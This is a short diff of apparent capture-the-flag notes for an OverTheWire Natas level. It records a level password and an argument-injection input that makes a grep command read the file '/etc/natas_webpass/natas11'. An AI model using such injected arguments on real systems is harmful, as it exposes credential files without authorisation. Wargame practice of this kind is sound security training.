@@ -1,3 +1,4 @@
 password: "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"
 
 Bash injection without semicolon and ampersand. grep the password file.
+u /etc/natas_webpass/natas11
